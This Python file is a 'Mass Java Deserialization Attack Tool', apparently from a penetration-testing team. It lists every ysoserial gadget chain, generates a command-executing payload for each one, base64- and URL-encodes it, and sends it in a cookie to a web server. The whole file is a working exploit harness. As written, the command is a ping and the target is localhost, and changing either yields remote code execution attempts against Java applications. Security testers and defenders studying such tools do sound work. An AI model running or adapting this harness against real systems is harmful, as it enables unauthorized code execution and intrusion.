#!/usr/bin/env python3.10
import sys
import requests
import subprocess
import urllib.parse

java_path="../../serialization/java" # ysoserial requires old java version, Java 12 seems to work with most payloads
ysoserial_path="../../serialization/ysoserial-all.jar"
exploit_cmd="ping -c 4 localhost"

print("\nMass Java Deserialization Attack Tool By Michał Majchrowicz AFINE Team v0.3\n")

list_payloads_command=f"{java_path} -jar {ysoserial_path}"

# Run the command
result = subprocess.run(list_payloads_command, shell=True, capture_output=True, text=True)

#print(result.stdout)
#print(result.stderr)
payloads_array=[]
had_payload=False
had_dashes=False

for line in result.stderr.split('\n'):
    #print(line.strip())
    columns=line.strip().split(' ')
    if had_payload:
        if had_dashes and len(columns[0]) > 0:
            payloads_array.append(columns[0])
        elif "-----" in line:
            had_dashes=True
    elif "Payload" in line:
        had_payload=True

for payload_type in payloads_array:
    generate_payloads_command=f"{java_path} -jar {ysoserial_path} {payload_type} '{exploit_cmd}' | base64"
    result = subprocess.run(generate_payloads_command, shell=True, capture_output=True, text=True)
    if len(result.stdout):
        print(f"Payload: {payload_type}")
        payload_value=urllib.parse.quote(result.stdout)
        # You can use Burps Copy As Python Requests here:
        cookies = { "payload_cookie": payload_value}
        response = requests.get("http://localhost/", cookies=cookies)

print("")
